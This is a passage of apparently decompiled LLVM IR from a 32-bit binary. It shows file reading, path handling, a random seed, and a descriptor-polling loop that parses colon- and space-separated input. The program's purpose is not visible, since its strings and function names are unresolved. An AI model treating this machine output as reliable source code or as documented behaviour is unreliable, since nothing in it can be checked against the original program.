  %v4_c178 = inttoptr i32 %v7_c174 to i32*
  store i32 %v7_c174, i32* %v4_c178, align 4
  %v5_c178 = load i32, i32* @r8, align 4
  %v6_c178 = load i32, i32* %r2.global-to-local, align 4
  %v7_c178 = sub i32 %v6_c178, %v5_c178
  store i32 %v7_c178, i32* %r2.global-to-local, align 4
  %v5_c17c = udiv i32 %v5_c178, 2097152
  %v6_c17c = and i32 %v7_c178, %v5_c17c
  store i32 %v6_c17c, i32* @r5, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_c174, %bb
  store i32 49548, i32* %stack_var_-4, align 4
  %v2_c188 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c188, i32* @fp, align 4
  %v2_c19c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_c19c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_19708.221 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_188d0.25 to i32), i32* @r1, align 4
  %v3_c1c4 = call i32 @function_d2bc(i32 ptrtoint ([19 x i8]* @global_var_19708.221 to i32), i32 ptrtoint ([2 x i8]* @global_var_188d0.25 to i32))
  store i32 %v3_c1c4, i32* @r0, align 4
  %v2_c1d4 = icmp eq i32 %v3_c1c4, 0
  br i1 %v2_c1d4, label %dec_label_pc_c1dc, label %dec_label_pc_c1f8

dec_label_pc_c1dc:                                ; preds = %.thread22
  store i32 ptrtoint ([13 x i8]* @global_var_1971c.224 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_188d0.25 to i32), i32* @r1, align 4
  %v3_c1ec = call i32 @function_d2bc(i32 ptrtoint ([13 x i8]* @global_var_1971c.224 to i32), i32 ptrtoint ([2 x i8]* @global_var_188d0.25 to i32))
  store i32 %v3_c1ec, i32* @r0, align 4
  br label %dec_label_pc_c1f8

dec_label_pc_c1f8:                                ; preds = %.thread22, %dec_label_pc_c1dc
  %stack_var_-68.0 = phi i32 [ %v3_c1ec, %dec_label_pc_c1dc ], [ %v3_c1c4, %.thread22 ]
  %stack_var_-72.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1971c.224, i32 0, i32 0), %dec_label_pc_c1dc ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_19708.221, i32 0, i32 0), %.thread22 ]
  %v2_c1fc = icmp eq i32 %stack_var_-68.0, 0
  br i1 %v2_c1fc, label %dec_label_pc_c38c, label %dec_label_pc_c204

dec_label_pc_c204:                                ; preds = %dec_label_pc_c1f8
  %v2_c214 = load i32, i32* %arg2, align 4
  store i32 %v2_c214, i32* @r0, align 4
  %v0_c21c = call i32 @function_f670()
  %v2_c230 = ptrtoint i32* %stack_var_-336 to i32
  %v2_c23c = call i32 @function_cdb0(i32 %v2_c230, i32 256)
  store i32 ptrtoint (i32* @global_var_1972c.226 to i32), i32* @r1, align 4
  %v2_c24c = bitcast i32* %stack_var_-336 to i8*
  %v3_c24c = call i32 @function_f6e0(i8* %v2_c24c, i32 ptrtoint (i32* @global_var_1972c.226 to i32))
  %v2_c254 = icmp eq i32 %v3_c24c, 0
  br i1 %v2_c254, label %dec_label_pc_c384, label %dec_label_pc_c26c

dec_label_pc_c260:                                ; preds = %dec_label_pc_c26c
  %v1_c264 = add i32 %stack_var_-64.0, -1
  br label %dec_label_pc_c26c

dec_label_pc_c26c:                                ; preds = %dec_label_pc_c204, %dec_label_pc_c260
  %stack_var_-64.0 = phi i32 [ %v1_c264, %dec_label_pc_c260 ], [ %v0_c21c, %dec_label_pc_c204 ]
  store i32 %v2_c19c, i32* %r2.global-to-local, align 4
  %v2_c27c = load i32, i32* %arg2, align 4
  store i32 %v2_c27c, i32* %r2.global-to-local, align 4
  %v2_c284 = add i32 %v2_c27c, %stack_var_-64.0
  %v1_c288 = inttoptr i32 %v2_c284 to i8*
  %v2_c288 = load i8, i8* %v1_c288, align 1
  %v7_c28c = icmp eq i8 %v2_c288, 47
  br i1 %v7_c28c, label %dec_label_pc_c294, label %dec_label_pc_c260

dec_label_pc_c294:                                ; preds = %dec_label_pc_c26c
  %v2_c2a4 = load i32, i32* %arg2, align 4
  %v2_c2ac = add i32 %v2_c2a4, %stack_var_-64.0
  %v2_c2b0 = ptrtoint i32* %stack_var_-600 to i32
  store i32 %v2_c230, i32* %r2.global-to-local, align 4
  store i32 %v2_c2b0, i32* @r0, align 4
  %v5_c2c4 = call i32 @function_d300(i32 %v2_c2b0, i32 ptrtoint ([8 x i8]* @global_var_19730.228 to i32), i32 %v2_c230, i32 %v2_c2ac)
  %v1_c318 = inttoptr i32 %stack_var_-68.0 to i16*
  %v2_c2d0 = ptrtoint i32* %stack_var_-1624 to i32
  %v2_c2f8 = bitcast i32* %stack_var_-1624 to i8*
  br label %dec_label_pc_c314.outer

dec_label_pc_c2cc:                                ; preds = %dec_label_pc_c314
  store i32 %stack_var_-68.0, i32* %r2.global-to-local, align 4
  %v3_c2e0 = call i32 @function_ed48(i32 %v2_c2d0, i32 1024, i32 %stack_var_-68.0)
  store i32 %v2_c2b0, i32* %r2.global-to-local, align 4
  %v3_c2f8 = call i32 @function_fa14(i8* %v2_c2f8, i32 %v2_c2b0)
  %v2_c300 = icmp eq i32 %v3_c2f8, 0
  br i1 %v2_c300, label %dec_label_pc_c308, label %dec_label_pc_c314

dec_label_pc_c308:                                ; preds = %dec_label_pc_c2cc
  %v1_c30c = add i32 %stack_var_-60.0.ph, 1
  br label %dec_label_pc_c314.outer

dec_label_pc_c314.outer:                          ; preds = %dec_label_pc_c308, %dec_label_pc_c294
  %stack_var_-60.0.ph = phi i32 [ %v1_c30c, %dec_label_pc_c308 ], [ 0, %dec_label_pc_c294 ]
  br label %dec_label_pc_c314

dec_label_pc_c314:                                ; preds = %dec_label_pc_c314.outer, %dec_label_pc_c2cc
  %v2_c318 = call i32 @function_eca4(i16* %v1_c318)
  %v2_c320 = icmp eq i32 %v2_c318, 0
  br i1 %v2_c320, label %dec_label_pc_c2cc, label %dec_label_pc_c328

dec_label_pc_c328:                                ; preds = %dec_label_pc_c314
  %v2_c32c = icmp eq i32 %stack_var_-60.0.ph, 0
  %v2_c338 = call i32 @function_d108(i16* %v1_c318)
  store i32 %v2_c338, i32* @r0, align 4
  br i1 %v2_c32c, label %dec_label_pc_c334, label %dec_label_pc_c38c

dec_label_pc_c334:                                ; preds = %dec_label_pc_c328
  %v4_c33c = ptrtoint i8* %stack_var_-72.0 to i32
  store i32 %v4_c33c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19738.230 to i32), i32* @r1, align 4
  %v3_c344 = call i32 @function_d2bc(i32 %v4_c33c, i32 ptrtoint (i32* @global_var_19738.230 to i32))
  store i32 %v3_c344, i32* @r0, align 4
  %v2_c354 = icmp eq i32 %v3_c344, 0
  br i1 %v2_c354, label %dec_label_pc_c38c, label %dec_label_pc_c35c

dec_label_pc_c35c:                                ; preds = %dec_label_pc_c334
  %v2_c368 = call i32 @function_eef8(i32 %v2_c2b0, i32 %v3_c344)
  %v1_c370 = inttoptr i32 %v3_c344 to i16*
  %v2_c370 = call i32 @function_d108(i16* %v1_c370)
  store i32 %v2_c370, i32* @r0, align 4
  br label %dec_label_pc_c38c

dec_label_pc_c384:                                ; preds = %dec_label_pc_c204
  %v1_c388 = inttoptr i32 %stack_var_-68.0 to i16*
  %v2_c388 = call i32 @function_d108(i16* %v1_c388)
  store i32 %v2_c388, i32* @r0, align 4
  br label %dec_label_pc_c38c

dec_label_pc_c38c:                                ; preds = %dec_label_pc_c328, %dec_label_pc_c334, %dec_label_pc_c1f8, %dec_label_pc_c35c, %dec_label_pc_c384
  %v0_c38c = call i32 @function_cf08()
  %v2_c394 = icmp eq i32 %v0_c38c, 0
  br i1 %v2_c394, label %dec_label_pc_c3a4, label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c38c
  %v1_c3a0 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_c3a4

dec_label_pc_c3a4:                                ; preds = %dec_label_pc_c38c, %dec_label_pc_c39c
  %v2_c3b4 = load i32, i32* %arg2, align 4
  store i32 %v2_c3b4, i32* @r4, align 4
  store i32 %v2_c19c, i32* %r2.global-to-local, align 4
  %v2_c3c8 = load i32, i32* %arg2, align 4
  store i32 %v2_c3c8, i32* @r0, align 4
  %v0_c3d0 = call i32 @function_f670()
  %v0_c3d8 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1973c.232 to i32), i32* @r1, align 4
  store i32 %v0_c3d0, i32* %r2.global-to-local, align 4
  %v4_c3e4 = call i32 @function_f910(i32 %v0_c3d8, i32 ptrtoint ([6 x i8]* @global_var_1973c.232 to i32), i32 %v0_c3d0)
  br label %dec_label_pc_c464

dec_label_pc_c3f4:                                ; preds = %dec_label_pc_c464
  %v3_c3f8 = mul i32 %storemerge12, 4
  store i32 %v3_c3f8, i32* %r2.global-to-local, align 4
  %v2_c410 = add i32 %v3_c3f8, %tmp
  %v1_c414 = inttoptr i32 %v2_c410 to i32*
  %v2_c414 = load i32, i32* %v1_c414, align 4
  store i32 %v2_c414, i32* @r4, align 4
  store i32 %v3_c3f8, i32* %r2.global-to-local, align 4
  %v2_c438 = load i32, i32* %v1_c414, align 4
  store i32 %v2_c438, i32* @r0, align 4
  %v0_c440 = call i32 @function_f670()
  %v0_c448 = load i32, i32* @r4, align 4
  store i32 %v0_c440, i32* @r2, align 4
  %v2_c454 = inttoptr i32 %v0_c448 to i8*
  %v3_c454 = call i32 @function_f5d0(i8* %v2_c454, i32 0)
  %v1_c45c = add nuw i32 %storemerge12, 1
  br label %dec_label_pc_c464

dec_label_pc_c464:                                ; preds = %dec_label_pc_c3a4, %dec_label_pc_c3f4
  %storemerge12 = phi i32 [ 1, %dec_label_pc_c3a4 ], [ %v1_c45c, %dec_label_pc_c3f4 ]
  store i32 %storemerge12, i32* %r2.global-to-local, align 4
  %v5_c47c = icmp slt i32 %storemerge12, %arg1
  br i1 %v5_c47c, label %dec_label_pc_c3f4, label %dec_label_pc_c480

dec_label_pc_c480:                                ; preds = %dec_label_pc_c464
  %v2_c484 = call i32 @function_ced8(i32* null)
  store i32 %v2_c484, i32* @r0, align 4
  %v0_c48c = call i32 @function_cec4()
  store i32 %v0_c48c, i32* @r0, align 4
  %v2_c494 = xor i32 %v2_c484, %v0_c48c
  store i32 %v2_c494, i32* @r4, align 4
  %v0_c498 = call i32 @function_cd9c()
  %v0_c4a0 = load i32, i32* @r4, align 4
  %v2_c4a0 = add i32 %v0_c4a0, %v0_c498
  %v1_c4a8 = call i32 @function_11620(i32 %v2_c4a0)
  %v0_c4ac = call i32 @function_86b4()
  store i32 %v0_c4ac, i32* %r2.global-to-local, align 4
  store i32 %v0_c4ac, i32* @global_var_2599c.175, align 4
  %v0_c4bc = call i32 @function_86b4()
  store i32 %v0_c4bc, i32* %r2.global-to-local, align 4
  store i32 %v0_c4bc, i32* @global_var_25998.29, align 4
  %v0_c4cc = call i32 @function_86b4()
  store i32 %v0_c4cc, i32* @global_var_259a4.236, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19744.239 to i32), i32* @global_var_25ab0.173, align 4
  store i32 ptrtoint (i32* @global_var_19748.242 to i32), i32* @global_var_25aac.197, align 4
  store i32 ptrtoint (i32* @global_var_25aa8.130 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_25aa8.130, align 4
  %v2_c53c = ptrtoint i32* %stack_var_-600 to i32
  %v2_c5fc = ptrtoint i32* %stack_var_-344 to i32
  %v2_c810 = ptrtoint i32* %stack_var_-6744 to i32
  %v2_c84c = add i32 %v2_c19c, -6720
  %v2_c904 = ptrtoint i32* %stack_var_-2648 to i32
  %v2_c910 = bitcast i32* %stack_var_-2648 to i8*
  %v2_c9b8 = ptrtoint i32* %stack_var_-1624 to i32
  %v3_c9c4 = bitcast i32* %stack_var_-1624 to i8*
  br label %dec_label_pc_c500

dec_label_pc_c500:                                ; preds = %dec_label_pc_c804, %dec_label_pc_c578, %dec_label_pc_ca80, %dec_label_pc_c480
  %v0_c500 = call i32 @function_be84()
  %v2_c508 = load i32, i32* @global_var_259a0.10, align 4
  %v2_c510 = load i32, i32* @global_var_2599c.175, align 4
  %v2_c518 = load i32, i32* @global_var_25998.29, align 4
  store i32 %v2_c518, i32* @lr, align 4
  store i32 %v2_c510, i32* @r2, align 4
  %v3_c538 = call i32 @function_8398(i32 %v2_c508, i32 ptrtoint ([41 x i8]* @global_var_1974c.246 to i32))
  br label %dec_label_pc_c550.lr.ph

dec_label_pc_c550.lr.ph:                          ; preds = %dec_label_pc_c7bc, %dec_label_pc_c83c, %dec_label_pc_caa0, %dec_label_pc_cac0, %dec_label_pc_c500
  br label %dec_label_pc_c550

dec_label_pc_c550:                                ; preds = %dec_label_pc_c550.lr.ph, %dec_label_pc_c550
  %storemerge1328 = phi i32 [ 0, %dec_label_pc_c550.lr.ph ], [ %v1_c564, %dec_label_pc_c550 ]
  store i32 %v2_c53c, i32* %r2.global-to-local, align 4
  %v5_c55c = mul nuw nsw i32 %storemerge1328, 4
  %v6_c55c = add i32 %v5_c55c, %v2_c53c
  %v7_c55c = inttoptr i32 %v6_c55c to i32*
  store i32 0, i32* %v7_c55c, align 4
  %v1_c564 = add nuw nsw i32 %storemerge1328, 1
  %tmp71 = icmp ult i32 %v1_c564, 32
  br i1 %tmp71, label %dec_label_pc_c550, label %dec_label_pc_c578

dec_label_pc_c578:                                ; preds = %dec_label_pc_c550
  %v2_c57c = load i32, i32* @global_var_259a0.10, align 4
  %v3_c580 = udiv i32 %v2_c57c, 32
  %v3_c594 = mul nuw nsw i32 %v3_c580, 4
  %v2_c59c = add i32 %v3_c594, %v2_c19c
  store i32 %v2_c59c, i32* %r2.global-to-local, align 4
  %v2_c5a0 = add i32 %v2_c59c, -576
  %v1_c5a4 = inttoptr i32 %v2_c5a0 to i32*
  %v2_c5a4 = load i32, i32* %v1_c5a4, align 4
  %v1_c5b0 = urem i32 %v2_c57c, 32
  %v6_c5b8 = shl i32 1, %v1_c5b0
  %v2_c5bc = or i32 %v2_c5a4, %v6_c5b8
  store i32 %v2_c5bc, i32* %v1_c5a4, align 4
  store i32 1200, i32* %stack_var_-344, align 4
  %v2_c5f0 = load i32, i32* @global_var_259a0.10, align 4
  %v1_c5f4 = add i32 %v2_c5f0, 1
  store i32 0, i32* %r2.global-to-local, align 4
  %v5_c610 = call i32 @function_cf58(i32 %v1_c5f4, i32 %v2_c53c, i32 0, i32 0, i32 %v2_c5fc)
  %tmp72 = icmp slt i32 %v5_c610, 1
  br i1 %tmp72, label %dec_label_pc_c500, label %dec_label_pc_c7a8.preheader

dec_label_pc_c7a8.preheader:                      ; preds = %dec_label_pc_c578
  %v2_c7ac102 = load i32, i32* @global_var_23248.14, align 4
  store i32 %v2_c7ac102, i32* %r2.global-to-local, align 4
  %v3_c7b4104 = icmp eq i32 %v2_c7ac102, 0
  br i1 %v3_c7b4104, label %dec_label_pc_c7bc, label %dec_label_pc_c62c

dec_label_pc_c62c:                                ; preds = %dec_label_pc_c79c, %dec_label_pc_c7a8.preheader
  %storemerge14111 = phi i32 [ %.pre129, %dec_label_pc_c79c ], [ 0, %dec_label_pc_c7a8.preheader ]
  %v3_c630 = mul i32 %storemerge14111, 4
  store i32 %v3_c630, i32* %r2.global-to-local, align 4
  %v2_c63c = load i32, i32* @global_var_25ab4.16, align 4
  %v2_c640 = add i32 %v2_c63c, %v3_c630
  %v1_c644 = inttoptr i32 %v2_c640 to i32*
  %v2_c644 = load i32, i32* %v1_c644, align 4
  store i32 %v2_c644, i32* @r0, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v3_c654 = call i32 @function_cf3c(i32 %v2_c644, i32 0, i32 1)
  %tmp73 = icmp slt i32 %v3_c654, 1
  %.pre129 = add i32 %storemerge14111, 1
  br i1 %tmp73, label %dec_label_pc_c79c, label %dec_label_pc_c6b8.preheader

dec_label_pc_c6b8.preheader:                      ; preds = %dec_label_pc_c62c
  %v2_c6bc81 = load i32, i32* @global_var_23248.14, align 4
  %v3_c6c483 = icmp ult i32 %.pre129, %v2_c6bc81
  %v2_c6d084 = load i32, i32* @global_var_25ab4.16, align 4
  %v1_c6d485 = add i32 %v2_c6d084, -4
  store i32 %v1_c6d485, i32* %r2.global-to-local, align 4
  %v3_c6dc86 = mul i32 %.pre129, 4
  %v2_c6e087 = add i32 %v1_c6d485, %v3_c6dc86
  br i1 %v3_c6c483, label %dec_label_pc_c674, label %dec_label_pc_c6cc

dec_label_pc_c674:                                ; preds = %dec_label_pc_c6b8.preheader, %dec_label_pc_c674
  %v2_c6e091 = phi i32 [ %v2_c6e0, %dec_label_pc_c674 ], [ %v2_c6e087, %dec_label_pc_c6b8.preheader ]
  %v3_c6dc90 = phi i32 [ %v3_c6dc, %dec_label_pc_c674 ], [ %v3_c6dc86, %dec_label_pc_c6b8.preheader ]
  %v2_c6d089 = phi i32 [ %v2_c6d0, %dec_label_pc_c674 ], [ %v2_c6d084, %dec_label_pc_c6b8.preheader ]
  %v1_c66888 = phi i32 [ %v1_c668, %dec_label_pc_c674 ], [ %.pre129, %dec_label_pc_c6b8.preheader ]
  store i32 %v3_c6dc90, i32* %r2.global-to-local, align 4
  %v2_c6a0 = add i32 %v2_c6d089, %v3_c6dc90
  %v1_c6a4 = inttoptr i32 %v2_c6a0 to i32*
  %v2_c6a4 = load i32, i32* %v1_c6a4, align 4
  %v2_c6a8 = inttoptr i32 %v2_c6e091 to i32*
  store i32 %v2_c6a4, i32* %v2_c6a8, align 4
  %v1_c668 = add i32 %v1_c66888, 1
  %v2_c6bc = load i32, i32* @global_var_23248.14, align 4
  %v3_c6c4 = icmp ult i32 %v1_c668, %v2_c6bc
  %v2_c6d0 = load i32, i32* @global_var_25ab4.16, align 4
  %v1_c6d4 = add i32 %v2_c6d0, -4
  store i32 %v1_c6d4, i32* %r2.global-to-local, align 4
  %v3_c6dc = mul i32 %v1_c668, 4
  %v2_c6e0 = add i32 %v1_c6d4, %v3_c6dc
  br i1 %v3_c6c4, label %dec_label_pc_c674, label %dec_label_pc_c6b8.dec_label_pc_c6cc_crit_edge

dec_label_pc_c6b8.dec_label_pc_c6cc_crit_edge:    ; preds = %dec_label_pc_c674
  br label %dec_label_pc_c6cc

dec_label_pc_c6cc:                                ; preds = %dec_label_pc_c6b8.dec_label_pc_c6cc_crit_edge, %dec_label_pc_c6b8.preheader
  %v2_c6e0.lcssa = phi i32 [ %v2_c6e0, %dec_label_pc_c6b8.dec_label_pc_c6cc_crit_edge ], [ %v2_c6e087, %dec_label_pc_c6b8.preheader ]
  %v2_c6e8 = inttoptr i32 %v2_c6e0.lcssa to i32*
  store i32 0, i32* %v2_c6e8, align 4
  %v2_c6f0 = load i32, i32* @global_var_23248.14, align 4
  %v1_c6f4 = add i32 %v2_c6f0, -1
  store i32 %v1_c6f4, i32* %r2.global-to-local, align 4
  store i32 %v1_c6f4, i32* @global_var_23248.14, align 4
  %v3_c70c = mul i32 %v2_c6f0, 4
  %v1_c714 = call i32 @function_10110(i32 %v3_c70c)
  %v2_c77095 = load i32, i32* @global_var_23248.14, align 4
  store i32 %v2_c77095, i32* %r2.global-to-local, align 4
  %v3_c77897 = icmp eq i32 %v2_c77095, 0
  br i1 %v3_c77897, label %dec_label_pc_c780, label %dec_label_pc_c72c

dec_label_pc_c72c:                                ; preds = %dec_label_pc_c6cc, %dec_label_pc_c72c
  %storemerge1698 = phi i32 [ %v1_c764, %dec_label_pc_c72c ], [ 0, %dec_label_pc_c6cc ]
  %v3_c730 = mul i32 %storemerge1698, 4
  %v2_c73c = add i32 %v3_c730, %v1_c714
  store i32 %v3_c730, i32* %r2.global-to-local, align 4
  %v2_c750 = load i32, i32* @global_var_25ab4.16, align 4
  %v2_c754 = add i32 %v2_c750, %v3_c730
  %v1_c758 = inttoptr i32 %v2_c754 to i32*
  %v2_c758 = load i32, i32* %v1_c758, align 4
  %v2_c75c = inttoptr i32 %v2_c73c to i32*
  store i32 %v2_c758, i32* %v2_c75c, align 4
  %v1_c764 = add i32 %storemerge1698, 1
  %v2_c770 = load i32, i32* @global_var_23248.14, align 4
  store i32 %v2_c770, i32* %r2.global-to-local, align 4
  %v3_c778 = icmp ult i32 %v1_c764, %v2_c770
  br i1 %v3_c778, label %dec_label_pc_c72c, label %dec_label_pc_c76c.dec_label_pc_c780_crit_edge

dec_label_pc_c76c.dec_label_pc_c780_crit_edge:    ; preds = %dec_label_pc_c72c
  br label %dec_label_pc_c780

dec_label_pc_c780:                                ; preds = %dec_label_pc_c6cc, %dec_label_pc_c76c.dec_label_pc_c780_crit_edge
  %v2_c784 = load i32, i32* @global_var_25ab4.16, align 4
  store i32 %v2_c784, i32* @r0, align 4
  %v0_c78c = call i32 @function_11048()
  store i32 ptrtoint (i32* @global_var_25ab4.16 to i32), i32* %r2.global-to-local, align 4
  store i32 %v1_c714, i32* @global_var_25ab4.16, align 4
  br label %dec_label_pc_c79c

dec_label_pc_c79c:                                ; preds = %dec_label_pc_c62c, %dec_label_pc_c780
  %v2_c7ac = load i32, i32* @global_var_23248.14, align 4
  store i32 %v2_c7ac, i32* %r2.global-to-local, align 4
  %v3_c7b4 = icmp ult i32 %.pre129, %v2_c7ac
  br i1 %v3_c7b4, label %dec_label_pc_c62c, label %dec_label_pc_c7bc

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c79c, %dec_label_pc_c7a8.preheader
  %v2_c7c0 = load i32, i32* @global_var_259a0.10, align 4
  %v3_c7c4 = udiv i32 %v2_c7c0, 32
  %v3_c7d0 = mul nuw nsw i32 %v3_c7c4, 4
  %v2_c7d8 = add i32 %v3_c7d0, %v2_c19c
  store i32 %v2_c7d8, i32* %r2.global-to-local, align 4
  %v2_c7dc = add i32 %v2_c7d8, -576
  %v1_c7e0 = inttoptr i32 %v2_c7dc to i32*
  %v2_c7e0 = load i32, i32* %v1_c7e0, align 4
  store i32 %v2_c7e0, i32* %r2.global-to-local, align 4
  %v1_c7ec = urem i32 %v2_c7c0, 32
  %v6_c7f02 = lshr i32 %v2_c7e0, %v1_c7ec
  %v1_c7f8 = urem i32 %v6_c7f02, 2
  %v2_c7fc = icmp eq i32 %v1_c7f8, 0
  br i1 %v2_c7fc, label %dec_label_pc_c550.lr.ph, label %dec_label_pc_c804

dec_label_pc_c804:                                ; preds = %dec_label_pc_c7bc
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_c824 = call i32 @function_ff88(i32 %v2_c7c0, i32 %v2_c810, i32 4096, i32 0)
  %tmp74 = icmp slt i32 %v4_c824, 1
  br i1 %tmp74, label %dec_label_pc_c500, label %dec_label_pc_c83c

dec_label_pc_c83c:                                ; preds = %dec_label_pc_c804
  %v2_c850 = add i32 %v2_c84c, %v4_c824
  %v3_c850 = inttoptr i32 %v2_c850 to i8*
  store i32 %v2_c850, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v3_c850, align 1
  %v6_c86c = call i32 @function_f9e4(i32 %v2_c810, i32 ptrtoint (i32* @global_var_19778.250 to i32), i32 %v2_c850, i32 %v2_c810, i32 %v4_c824)
  %v2_cab831 = icmp eq i32 %v6_c86c, 0
  br i1 %v2_cab831, label %dec_label_pc_c550.lr.ph, label %dec_label_pc_cac0

dec_label_pc_c87c:                                ; preds = %dec_label_pc_cac0
  %v2_c880 = call i32 @function_8628(i32 %storemerge33.in)
  %v2_c888 = load i8, i8* %storemerge33, align 1
  %v7_c88c = icmp eq i8 %v2_c888, 58
  br i1 %v7_c88c, label %dec_label_pc_c8ac, label %dec_label_pc_c938

dec_label_pc_c8a0:                                ; preds = %dec_label_pc_c8c4
  %v1_c8a4 = add i32 %storemerge21, 1
  br label %dec_label_pc_c8ac

dec_label_pc_c8ac:                                ; preds = %dec_label_pc_c87c, %dec_label_pc_c8a0
  %storemerge21 = phi i32 [ %v1_c8a4, %dec_label_pc_c8a0 ], [ 0, %dec_label_pc_c87c ]
  store i32 %storemerge33.in, i32* @r0, align 4
  %v0_c8b4 = call i32 @function_f670()
  %v3_c8bc = icmp ult i32 %storemerge21, %v0_c8b4
  br i1 %v3_c8bc, label %dec_label_pc_c8c4, label %dec_label_pc_c8ac.dec_label_pc_c8e0_crit_edge

dec_label_pc_c8ac.dec_label_pc_c8e0_crit_edge:    ; preds = %dec_label_pc_c8ac
  %.pre = add i32 %storemerge21, %storemerge33.in
  %.pre34 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_c8e0

dec_label_pc_c8c4:                                ; preds = %dec_label_pc_c8ac
  store i32 %storemerge21, i32* %r2.global-to-local, align 4
  %v2_c8d0 = add i32 %storemerge21, %storemerge33.in
  %v1_c8d4 = inttoptr i32 %v2_c8d0 to i8*
  %v2_c8d4 = load i8, i8* %v1_c8d4, align 1
  %v7_c8d8 = icmp eq i8 %v2_c8d4, 32
  br i1 %v7_c8d8, label %dec_label_pc_c8e0, label %dec_label_pc_c8a0

dec_label_pc_c8e0:                                ; preds = %dec_label_pc_c8c4, %dec_label_pc_c8ac.dec_label_pc_c8e0_crit_edge
  %v3_c8f4.pre-phi = phi i8* [ %.pre34, %dec_label_pc_c8ac.dec_label_pc_c8e0_crit_edge ], [ %v1_c8d4, %dec_label_pc_c8c4 ]
  %v2_c8ec.pre-phi = phi i32 [ %.pre, %dec_label_pc_c8ac.dec_label_pc_c8e0_crit_edge ], [ %v2_c8d0, %dec_label_pc_c8c4 ]
  store i8 0, i8* %v3_c8f4.pre-phi, align 1
  %v1_c8fc = add i32 %storemerge33.in, 1
  store i32 %v1_c8fc, i32* %r2.global-to-local, align 4
  store i32 %v1_c8fc, i32* @r1, align 4
  %v3_c910 = call i32 @function_f8ec(i8* %v2_c910, i32 %v1_c8fc)
  store i32 %storemerge21, i32* %r2.global-to-local, align 4
  %v1_c924 = add i32 %v2_c8ec.pre-phi, 1
  store i32 %v1_c924, i32* @r1, align 4
  %v4_c930 = call i32 @function_f8ec(i8* %storemerge33, i32 %v1_c924)
  br label %dec_label_pc_c950

dec_label_pc_c938:                                ; preds = %dec_label_pc_c87c
  store i32 %v2_c904, i32* @r3, align 4
  store i32 %v2_c904, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1977c.252 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  %v0_c94c = call i32 @function_f700()
  br label %dec_label_pc_c950

dec_label_pc_c950:                                ; preds = %dec_label_pc_c8e0, %dec_label_pc_c938
  br label %dec_label_pc_c968

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c980
  %v1_c960 = add i32 %storemerge18, 1
  br label %dec_label_pc_c968

dec_label_pc_c968:                                ; preds = %dec_label_pc_c950, %dec_label_pc_c95c
  %storemerge18 = phi i32 [ 0, %dec_label_pc_c950 ], [ %v1_c960, %dec_label_pc_c95c ]
  store i32 %storemerge18, i32* @r4, align 4
  store i32 %storemerge33.in, i32* @r0, align 4
  %v0_c970 = call i32 @function_f670()
  %v0_c978 = load i32, i32* @r4, align 4
  %v3_c978 = icmp ult i32 %v0_c978, %v0_c970
  br i1 %v3_c978, label %dec_label_pc_c980, label %dec_label_pc_c968.dec_label_pc_c99c_crit_edge

dec_label_pc_c968.dec_label_pc_c99c_crit_edge:    ; preds = %dec_label_pc_c968
  %.pre35 = add i32 %storemerge18, %storemerge33.in
  %.pre36 = inttoptr i32 %.pre35 to i8*
  br label %dec_label_pc_c99c

dec_label_pc_c980:                                ; preds = %dec_label_pc_c968
  store i32 %storemerge18, i32* %r2.global-to-local, align 4
  %v2_c98c = add i32 %storemerge18, %storemerge33.in
  %v1_c990 = inttoptr i32 %v2_c98c to i8*
  %v2_c990 = load i8, i8* %v1_c990, align 1
  %v7_c994 = icmp eq i8 %v2_c990, 32
  br i1 %v7_c994, label %dec_label_pc_c99c, label %dec_label_pc_c95c

dec_label_pc_c99c:                                ; preds = %dec_label_pc_c980, %dec_label_pc_c968.dec_label_pc_c99c_crit_edge
  %v3_c9b0.pre-phi = phi i8* [ %.pre36, %dec_label_pc_c968.dec_label_pc_c99c_crit_edge ], [ %v1_c990, %dec_label_pc_c980 ]
  %v2_c9a8.pre-phi = phi i32 [ %.pre35, %dec_label_pc_c968.dec_label_pc_c99c_crit_edge ], [ %v2_c98c, %dec_label_pc_c980 ]
  store i32 %v2_c9a8.pre-phi, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v3_c9b0.pre-phi, align 1
  store i32 %storemerge33.in, i32* @r1, align 4
  %v4_c9c4 = call i32 @function_f8ec(i8* %v3_c9c4, i32 %storemerge33.in)
  store i32 %storemerge18, i32* %r2.global-to-local, align 4
  %v1_c9d8 = add i32 %v2_c9a8.pre-phi, 1
  store i32 %v1_c9d8, i32* @r1, align 4
  %v4_c9e4 = call i32 @function_f8ec(i8* %storemerge33, i32 %v1_c9d8)
  store i32 143232, i32* %r2.global-to-local, align 4
  %v7_ca74112 = load i32, i32* inttoptr (i32 143232 to i32*), align 128
  %v2_ca78114 = icmp eq i32 %v7_ca74112, 0
  br i1 %v2_ca78114, label %dec_label_pc_ca80, label %dec_label_pc_c9f4

dec_label_pc_c9f4:                                ; preds = %dec_label_pc_c99c, %dec_label_pc_c9f4
  %v6_ca74117 = phi i32* [ %v6_ca74, %dec_label_pc_c9f4 ], [ inttoptr (i32 143232 to i32*), %dec_label_pc_c99c ]
  %storemerge19115 = phi i32 [ %v1_ca64, %dec_label_pc_c9f4 ], [ 0, %dec_label_pc_c99c ]
  store i32 %storemerge19115, i32* %r2.global-to-local, align 4
  %v7_c9fc = load i32, i32* %v6_ca74117, align 8
  store i32 %v2_c9b8, i32* %r2.global-to-local, align 4
